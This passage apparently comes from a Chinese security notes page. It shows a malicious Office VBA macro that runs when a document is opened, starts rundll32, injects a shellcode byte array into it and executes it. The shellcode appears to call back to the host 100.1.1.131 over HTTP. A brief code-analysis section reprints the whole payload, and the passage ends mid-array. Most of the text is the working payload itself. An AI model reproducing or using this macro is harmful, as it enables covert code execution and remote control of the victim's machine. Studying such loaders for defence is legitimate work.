68,111,119,110,108,111,97,100,32,55,51,51,59,32,73,110,102,111,80,97,116,104,46,50,41,13,10,0,-111,-101,90,56,32,-115,-23,-46,-92,90,98,26, _
93,-84,-29,-103,28,86,81,-101,-43,88,-56,-37,-28,-52,75,-99,60,-123,-63,-92,109,23,-13,71,32,124,-3,-51,72,6,28,32,21,23,100,-38,9,121,99,114, _
-26,54,-2,84,45,-95,-32,90,-108,20,-74,50,66,116,-113,-28,-31,49,-55,-23,-81,120,53,32,-127,31,8,23,20,-80,20,-50,-122,113,-19,5,67,-35,72,-38, _
108,-128,-52,-46,30,-35,49,78,-62,20,-63,-124,-116,-41,-100,-95,-49,117,82,83,49,-77,35,103,6,-122,77,-57,106,-33,-46,36,-76,4,-30,-23,18,119,54,-121, _
-54,119,0,-81,-125,-46,87,32,-110,-33,-103,52,-71,-116,-15,25,101,-37,108,51,15,88,-6,-33,68,-119,-97,-8,-24,7,6,-30,-128,1,102,-9,-41,33,34,59, _
12,-124,78,3,-105,-100,-84,-105,-52,88,12,113,124,-116,69,82,-66,-124,63,96,-36,38,69,14,-111,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _
104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _
-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,48,48,46,49,46,49,46,49,51,49,0,0,1,-122,-96)
    If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then
        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;
    Else
        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;
    End If

    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)

    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)
    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)
    Next offset
    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407011629222.png" alt="image-20240701162942046"></p><hr><h3 id="代码解析" tabindex="-1"><a class="header-anchor" href="#代码解析"><span>代码解析</span></a></h3><p>直接捋主逻辑</p><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Sub</span> AutoOpen<span class="token punctuation">(</span><span class="token punctuation">)</span>
    Auto_Open
<span class="token keyword">End</span> <span class="token keyword">Sub</span>

<span class="token keyword">Sub</span> Workbook_Open<span class="token punctuation">(</span><span class="token punctuation">)</span>
    Auto_Open
<span class="token keyword">End</span> <span class="token keyword">Sub</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>指示在文档打开时自动调用 <code>Sub Auto_Open</code> 的代码</p><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Sub</span> Auto_Open<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">Dim</span> myByte <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> myArray <span class="token keyword">As</span> <span class="token keyword">Variant</span><span class="token punctuation">,</span> offset <span class="token keyword">As</span> <span class="token keyword">Long</span>
    <span class="token keyword">Dim</span> pInfo <span class="token keyword">As</span> PROCESS_INFORMATION
    <span class="token keyword">Dim</span> sInfo <span class="token keyword">As</span> STARTUPINFO
    <span class="token keyword">Dim</span> sNull <span class="token keyword">As</span> <span class="token keyword">String</span>
    <span class="token keyword">Dim</span> sProc <span class="token keyword">As</span> <span class="token keyword">String</span>

    <span class="token directive property">#If VBA7 Then</span>
        <span class="token keyword">Dim</span> rwxpage <span class="token keyword">As</span> LongPtr<span class="token punctuation">,</span> res <span class="token keyword">As</span> LongPtr
    <span class="token operator">#</span><span class="token keyword">Else</span>
        <span class="token keyword">Dim</span> rwxpage <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> res <span class="token keyword">As</span> <span class="token keyword">Long</span>
    <span class="token directive property">#End If</span>
    myArray <span class="token operator">=</span> Array<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token number">13</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token operator">-</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">89</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token operator">-</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">89</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token operator">-</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token number">104</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">94</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token operator">-</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">113</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">89</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">53</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">113</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">98</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token number">92</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">75</span><span class="token punctuation">,</span> <span class="token operator">_</span>
<span class="token number">87</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token 